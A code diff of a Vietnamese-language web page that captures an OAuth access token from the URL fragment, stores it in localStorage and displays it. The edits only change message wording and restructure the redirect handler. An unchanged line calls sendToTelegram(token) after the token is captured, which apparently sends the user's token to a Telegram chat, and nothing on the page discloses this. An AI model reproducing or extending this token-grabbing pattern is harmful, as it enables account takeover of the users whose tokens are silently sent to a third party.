@@ -28,7 +28,7 @@ if(token&&token.length>50){
 localStorage.setItem('meo_token',token);
 tokenDisplay.textContent=token;
 tokenDisplay.className='token-box has-token';
-statusMsg.textContent='✅ ĐÃ LẤY TOKEN';
+statusMsg.textContent='✅ Đã lấy token';
 statusMsg.className='status success';
 showToast('✅ Lấy token thành công!','success');
 sendToTelegram(token);
@@ -54,12 +54,13 @@ window.location.href=authUrl;
 
 function handleRedirect(){
 const hash=window.location.hash.substring(1);
-if(!hash)return;
+if(hash){
 const params=new URLSearchParams(hash);
-const accessToken=params.get('access_token');
-if(accessToken){
-setToken(accessToken);
+const token=params.get('access_token');
+if(token){
+setToken(token);
 window.history.replaceState({},document.title,window.location.pathname);
+}
 }
 }
 
